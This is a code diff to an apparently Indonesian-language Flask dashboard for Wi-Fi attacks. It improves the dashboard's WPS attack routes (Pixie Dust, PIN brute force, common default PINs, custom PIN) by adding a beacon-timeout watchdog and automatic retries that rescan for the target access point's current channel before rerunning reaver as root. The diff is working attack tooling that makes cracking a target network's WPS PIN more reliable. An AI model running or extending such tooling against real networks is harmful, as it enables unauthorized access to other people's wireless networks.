@@ -194,10 +194,20 @@ JOBS_LOCK = threading.Lock()
 JOB_TTL_SECONDS = 7 * 24 * 60 * 60
 ANSI_RE = re.compile(r"\x1b\[[0-?]*[ -/]*[@-~]")
 PTY_ROWS, PTY_COLS = 60, 220
+BEACON_WAIT_LIMIT = 30
 
 
 class Job:
-    def __init__(self, label, commands, target="", timeout=None, duration=None):
+    def __init__(
+        self,
+        label,
+        commands,
+        target="",
+        timeout=None,
+        duration=None,
+        retry_builder=None,
+        max_retries=0,
+    ):
         self.id = uuid.uuid4().hex[:12]
         self.label = label
         self.commands = commands
@@ -214,6 +224,11 @@ class Job:
         self._done = threading.Event()
         self.duration_hit = False
         self._progress_open = False
+        self._beacon_timer = None
+        self.beacon_timed_out = False
+        self.retry_builder = retry_builder
+        self.max_retries = max_retries
+        self.retry_attempts = 0
 
     @property
     def command_preview(self):
@@ -224,6 +239,49 @@ class Job:
         with self._lock:
             self.lines.append(line)
             self._progress_open = False
+        if "Waiting for beacon from" in line:
+            self._arm_beacon_watchdog()
+        elif "Received beacon from" in line:
+            self._cancel_beacon_watchdog()
+
+    def _arm_beacon_watchdog(self):
+        """Hentikan reaver yang tidak pernah melihat beacon target.
+
+        Reaver 1.6.6 menunggu beacon tanpa batas. Jika channel target berubah
+        atau sinyal hilang, terminal terlihat menggantung selamanya.
+        """
+        with self._lock:
+            if self.status != "running" or self._beacon_timer is not None:
+                return
+            timer = threading.Timer(BEACON_WAIT_LIMIT, self._beacon_timeout)
+            timer.daemon = True
+            self._beacon_timer = timer
+            timer.start()
+
+    def _cancel_beacon_watchdog(self):
+        with self._lock:
+            timer = self._beacon_timer
+            self._beacon_timer = None
+        if timer is not None:
+            timer.cancel()
+
+    def _beacon_timeout(self):
+        with self._lock:
+            if self.status != "running":
+                return
+            self.beacon_timed_out = True
+        if self.retry_builder is not None and self.retry_attempts < self.max_retries:
+            reason = (
+                f"tidak ada beacon dari target selama {BEACON_WAIT_LIMIT} detik; "
+                "channel akan di-refresh dari scan baru lalu dicoba ulang otomatis"
+            )
+        else:
+            reason = (
+                f"tidak ada beacon dari target selama {BEACON_WAIT_LIMIT} detik. "
+                "Channel target mungkin sudah berubah atau sinyal terlalu lemah; "
+                "scan ulang lalu jalankan lagi"
+            )
+        self.stop(reason)
 
     def append_progress(self, text):
         """Perbarui baris progres terakhir (perilaku carriage-return terminal)."""
@@ -271,6 +329,7 @@ class Job:
             self.rc = rc
             self.status = "done" if rc == 0 else "failed"
             self.finished_at = datetime.now()
+        self._cancel_beacon_watchdog()
         self._done.set()
 
     def _terminate(self, grace=45):
@@ -295,6 +354,7 @@ class Job:
             self.finished_at = datetime.now()
             self.lines.append(f"[system] {reason} — proses dihentikan.")
         self._terminate()
+        self._cancel_beacon_watchdog()
         self._done.set()
         return True
 
@@ -307,6 +367,7 @@ class Job:
             self.finished_at = datetime.now()
             self.lines.append(f"[system] batas waktu {self.timeout}s tercapai — proses dihentikan.")
         self._terminate()
+        self._cancel_beacon_watchdog()
         self._done.set()
 
     def mark_duration(self):
@@ -479,6 +540,40 @@ def _ensure_link_restored(job, iface, attempts=4):
     return False
 
 
+def _prepare_retry(job):
+    """Siapkan percobaan ulang setelah beacon timeout.
+
+    Builder melakukan scan baru sehingga channel yang dipin mengikuti posisi AP
+    saat ini, bukan channel lama dari halaman detail.
+    """
+    if job.retry_builder is None or job.retry_attempts >= job.max_retries:
+        return False
+    try:
+        commands = job.retry_builder(job.retry_attempts + 1)
+    except Exception as exc:  # noqa: BLE001 - jangan matikan job karena scan gagal
+        job.append(f"[error] gagal menyiapkan percobaan ulang: {exc}")
+        return False
+    if not commands:
+        job.append(
+            "[system] percobaan ulang dibatalkan: target tidak ditemukan pada scan terbaru."
+        )
+        return False
+
+    job.retry_attempts += 1
+    job.commands = commands
+    job.rc = None
+    job.finished_at = None
+    job.beacon_timed_out = False
+    with job._lock:
+        job.status = "running"
+    job._done.clear()
+    job.append(
+        f"[system] percobaan ulang {job.retry_attempts}/{job.max_retries}: "
+        "channel target diambil dari scan terbaru."
+    )
+    return True
+
+
 def _run_job(job):
     rc = 0
     duration_timer = None
@@ -500,59 +595,66 @@ def _run_job(job):
 
         threading.Thread(target=_heartbeat, daemon=True).start()
     try:
-        for index, cmd in enumerate(job.commands, 1):
-            if job.status != "running":
-                return
-            if len(job.commands) > 1:
-                job.append(f"[system] langkah {index}/{len(job.commands)}")
-            job.append(f"$ {' '.join(pretty_command(cmd))}")
-            parts = [str(part) for part in cmd]
-            if "airodump-ng" in parts and "--background" in parts:
-                job.append(
-                    "[system] UI airodump dinonaktifkan agar log tidak membanjir; "
-                    "capture tetap berjalan dan hasil disimpan di folder captures/."
-                )
-            timer = None
-            if job.timeout:
-                timer = threading.Timer(job.timeout, job.mark_timeout)
-                timer.daemon = True
-                timer.start()
-            try:
-                rc = _spawn_with_pty(job, cmd)
-            except FileNotFoundError:
-                job.append(f"[error] perintah tidak ditemukan: {cmd[0]}")
-                if cmd[0] == "sudo" or Path(cmd[0]).name in ("wifi-lab-priv", "privileged_helper.py"):
-                    job.append("[hint] Akses root belum siap. Jalankan ./setup_privileges.sh lalu coba lagi.")
-                else:
-                    tool = pretty_command(cmd)[0] if cmd else cmd[0]
-                    pkg = TOOL_APT_MAP.get(tool, tool)
-                    job.append(f"[hint] Pasang dulu: sudo apt-get install -y {pkg} (atau lewat Toolkit di dashboard).")
-                rc = 127
+        while True:
+            retry = False
+            for index, cmd in enumerate(job.commands, 1):
+                if job.status != "running":
+                    return
                 if len(job.commands) > 1:
-                    job.append("")
-                    continue
-                job.finish(rc)
-                return
-            finally:
-                if timer is not None:
-                    timer.cancel()
+                    job.append(f"[system] langkah {index}/{len(job.commands)}")
+                job.append(f"$ {' '.join(pretty_command(cmd))}")
+                parts = [str(part) for part in cmd]
+                if "airodump-ng" in parts and "--background" in parts:
+                    job.append(
+                        "[system] UI airodump dinonaktifkan agar log tidak membanjir; "
+                        "capture tetap berjalan dan hasil disimpan di folder captures/."
+                    )
+                timer = None
+                if job.timeout:
+                    timer = threading.Timer(job.timeout, job.mark_timeout)
+                    timer.daemon = True
+                    timer.start()
+                try:
+                    rc = _spawn_with_pty(job, cmd)
+                except FileNotFoundError:
+                    job.append(f"[error] perintah tidak ditemukan: {cmd[0]}")
+                    if cmd[0] == "sudo" or Path(cmd[0]).name in ("wifi-lab-priv", "privileged_helper.py"):
+                        job.append("[hint] Akses root belum siap. Jalankan ./setup_privileges.sh lalu coba lagi.")
+                    else:
+                        tool = pretty_command(cmd)[0] if cmd else cmd[0]
+                        pkg = TOOL_APT_MAP.get(tool, tool)
+                        job.append(f"[hint] Pasang dulu: sudo apt-get install -y {pkg} (atau lewat Toolkit di dashboard).")
+                    rc = 127
+                    if len(job.commands) > 1:
+                        job.append("")
+                        continue
+                    job.finish(rc)
+                    return
+                finally:
+                    if timer is not None:
+                        timer.cancel()
 
-            if job.status != "running":
-                _ensure_link_restored(job, _job_monitor_iface(job))
-                return
+                if job.status != "running":
+                    _ensure_link_restored(job, _job_monitor_iface(job))
+                    retry = _prepare_retry(job)
+                    break
 
-            if job.duration_hit:
-                _ensure_link_restored(job, _job_monitor_iface(job))
-                job.finish_duration()
-                return
+                if job.duration_hit:
+                    _ensure_link_restored(job, _job_monitor_iface(job))
+                    job.finish_duration()
+                    return
 
-            job.append(f"[exit] kode {rc}")
-            if rc != 0 and len(job.commands) > 1:
-                job.append("[system] langkah gagal, lanjut ke PIN berikutnya.")
-            job.append("")
+                job.append(f"[exit] kode {rc}")
+                if rc != 0 and len(job.commands) > 1:
+                    job.append("[system] langkah gagal, lanjut ke PIN berikutnya.")
+                job.append("")
 
-        _ensure_link_restored(job, _job_monitor_iface(job))
-        job.finish(rc)
+            if retry:
+                continue
+
+            _ensure_link_restored(job, _job_monitor_iface(job))
+            job.finish(rc)
+            return
     except Exception as exc:
         job.append(f"[error] {exc}")
         job._terminate()
@@ -576,17 +678,49 @@ def _prune_jobs():
             JOBS.pop(job_id, None)
 
 
-def start_job(label, commands, target="", timeout=None, duration=None):
+def start_job(
+    label,
+    commands,
+    target="",
+    timeout=None,
+    duration=None,
+    retry_builder=None,
+    max_retries=0,
+):
     _prune_jobs()
-    job = Job(label, commands, target=target, timeout=timeout, duration=duration)
+    job = Job(
+        label,
+        commands,
+        target=target,
+        timeout=timeout,
+        duration=duration,
+        retry_builder=retry_builder,
+        max_retries=max_retries,
+    )
     with JOBS_LOCK:
         JOBS[job.id] = job
     threading.Thread(target=_run_job, args=(job,), daemon=True).start()
     return job
 
 
-def launch_job(label, commands, target="", timeout=None, duration=None):
-    job = start_job(label, commands, target=target, timeout=timeout, duration=duration)
+def launch_job(
+    label,
+    commands,
+    target="",
+    timeout=None,
+    duration=None,
+    retry_builder=None,
+    max_retries=0,
+):
+    job = start_job(
+        label,
+        commands,
+        target=target,
+        timeout=timeout,
+        duration=duration,
+        retry_builder=retry_builder,
+        max_retries=max_retries,
+    )
     return redirect(url_for("terminal", job_id=job.id))
 
 
@@ -601,7 +735,15 @@ def failed_job(label, message, target=""):
     return redirect(url_for("terminal", job_id=job.id))
 
 
-def launch_privileged(label, commands, target="", timeout=None, duration=None):
+def launch_privileged(
+    label,
+    commands,
+    target="",
+    timeout=None,
+    duration=None,
+    retry_builder=None,
+    max_retries=0,
+):
     """Jalankan job yang butuh root, atau tampilkan panduan yang jelas."""
     status = privilege_status(force=True)
     if not status["ready"]:
@@ -619,7 +761,15 @@ def launch_privileged(label, commands, target="", timeout=None, duration=None):
             "[info] Setelah setup selesai, muat ulang halaman ini dan klik Run kembali.",
             target=target,
         )
-    return launch_job(label, commands, target=target, timeout=timeout, duration=duration)
+    return launch_job(
+        label,
+        commands,
+        target=target,
+        timeout=timeout,
+        duration=duration,
+        retry_builder=retry_builder,
+        max_retries=max_retries,
+    )
 
 
 # ---------------------------------------------------------------------------
@@ -1893,9 +2043,99 @@ def _form_iface_bssid():
     return iface, bssid, channel, _target_label(ssid, bssid), ""
 
 
+def _fresh_channel(iface, bssid):
+    """Channel target dari scan NetworkManager terbaru.
+
+    Channel pada form bisa berasal dari halaman detail yang sudah lama dan AP
+    bisa berpindah channel. Paksa rescan agar reaver tidak menunggu beacon di
+    channel yang salah. Return "" bila target tidak terlihat.
+    """
+    rc, out, _ = run_cmd(
+        [
+            "nmcli", "-t", "-f", "BSSID,CHAN", "device", "wifi", "list",
+            "ifname", iface, "--rescan", "yes",
+        ],
+        timeout=60,
+    )
+    if rc != 0:
+        return ""
+    for line in out.splitlines():
+        parts = line.split(":")
+        if len(parts) < 7:
+            continue
+        mac = _normalize_mac(":".join(parts[:6]))
+        channel = parts[-1].strip()
+        if (
+            _validate_bssid(mac)
+            and mac.upper() == bssid.upper()
+            and channel.isdigit()
+        ):
+            return channel
+    return ""
+
+
 def _reaver_channel_args(channel):
-    """Beri reaver channel eksplisit agar tidak channel-hopping lama."""
-    return ["-c", str(channel)] if channel else []
+    """Argumen channel reaver yang dipin ke channel target.
+
+    Reaver 1.6.6 tidak bisa diandalkan untuk berpindah channel: `change_channel`
+    melaporkan sukses walau firmware iwlwifi tetap di channel lama. Karena itu
+    channel dipin dengan `-c`; kalau AP pindah channel, beacon timeout akan
+    memicu percobaan ulang dengan channel hasil scan baru.
+    """
+    if not channel or not channel.isdigit():
+        return []
+    number = int(channel)
+    if number < 1 or number > 200:
+        return []
+    args = ["-c", channel]
+    if number > 14:
+        # Batasi channel hopping reaver ke band 5 GHz.
+        args = ["-5", *args]
+    return args
+
+
+def _reaver_target(iface, bssid, fallback_channel):
+    """Tentukan channel monitor dan argumen channel reaver dari scan baru.
+
+    Return (channel, args). Bila target tidak terlihat pada scan, channel form
+    dipakai sebagai titik awal dan reaver dibiarkan hopping (tanpa `-c`).
+    """
+    fresh = _fresh_channel(iface, bssid)
+    channel = fresh or fallback_channel
+    if fresh:
+        return channel, _reaver_channel_args(fresh)
+    number = int(channel) if channel.isdigit() else 0
+    return channel, (["-5"] if number > 14 else [])
+
+
+def launch_wps(
+    label,
+    iface,
+    bssid,
+    target,
+    fallback_channel,
+    build,
+    timeout=None,
+    max_retries=2,
+):
+    """Jalankan modul WPS dengan auto-retry saat beacon tidak terlihat.
+
+    `build(channel, channel_args)` mengembalikan daftar perintah. Setiap
+    percobaan melakukan scan baru supaya channel yang dipin sesuai posisi AP.
+    """
+
+    def retry_builder(_attempt):
+        channel, channel_args = _reaver_target(iface, bssid, fallback_channel)
+        return build(channel, channel_args)
+
+    return launch_privileged(
+        label,
+        retry_builder(0),
+        target=target,
+        timeout=timeout,
+        retry_builder=retry_builder,
+        max_retries=max_retries,
+    )
 
 
 @app.route("/attack/wps/pixie-dust", methods=["POST"])
@@ -1904,10 +2144,15 @@ def attack_wps_pixie():
     if err:
         flash(err, "error")
         return redirect(url_for("index"))
-    return launch_privileged(
+    return launch_wps(
         "WPS Pixie Dust",
-        [monitor_command(iface, channel, "reaver", *_reaver_channel_args(channel), "-i", iface, "-b", bssid, "-K", "1", "-vv")],
-        target=target,
+        iface,
+        bssid,
+        target,
+        channel,
+        lambda ch, extra: [
+            monitor_command(iface, ch, "reaver", *extra, "-i", iface, "-b", bssid, "-K", "1", "-vv")
+        ],
     )
 
 
@@ -1917,10 +2162,15 @@ def attack_wps_pin_brute():
     if err:
         flash(err, "error")
         return redirect(url_for("index"))
-    return launch_privileged(
+    return launch_wps(
         "WPS Pin Brute",
-        [monitor_command(iface, channel, "reaver", *_reaver_channel_args(channel), "-i", iface, "-b", bssid, "-vv")],
-        target=target,
+        iface,
+        bssid,
+        target,
+        channel,
+        lambda ch, extra: [
+            monitor_command(iface, ch, "reaver", *extra, "-i", iface, "-b", bssid, "-vv")
+        ],
     )
 
 
@@ -1931,11 +2181,17 @@ def attack_wps_common_pins():
         flash(err, "error")
         return redirect(url_for("index"))
     common = ["12345670", "00005678", "12345678", "99985677", "00000000"]
-    commands = [
-        monitor_command(iface, channel, "reaver", *_reaver_channel_args(channel), "-i", iface, "-b", bssid, "-p", pin, "-vv")
-        for pin in common
-    ]
-    return launch_privileged("WPS Common Pins", commands, target=target)
+    return launch_wps(
+        "WPS Common Pins",
+        iface,
+        bssid,
+        target,
+        channel,
+        lambda ch, extra: [
+            monitor_command(iface, ch, "reaver", *extra, "-i", iface, "-b", bssid, "-p", pin, "-vv")
+            for pin in common
+        ],
+    )
 
 
 @app.route("/attack/wps/custom-pin", methods=["POST"])
@@ -1948,10 +2204,15 @@ def attack_wps_custom_pin():
     if not re.fullmatch(r"[0-9]{8}", pin):
         flash("PIN harus 8 digit angka.", "error")
         return redirect(url_for("index"))
-    return launch_privileged(
+    return launch_wps(
         f"WPS Custom Pin ({pin})",
-        [monitor_command(iface, channel, "reaver", *_reaver_channel_args(channel), "-i", iface, "-b", bssid, "-p", pin, "-vv")],
-        target=target,
+        iface,
+        bssid,
+        target,
+        channel,
+        lambda ch, extra: [
+            monitor_command(iface, ch, "reaver", *extra, "-i", iface, "-b", bssid, "-p", pin, "-vv")
+        ],
     )
 
 
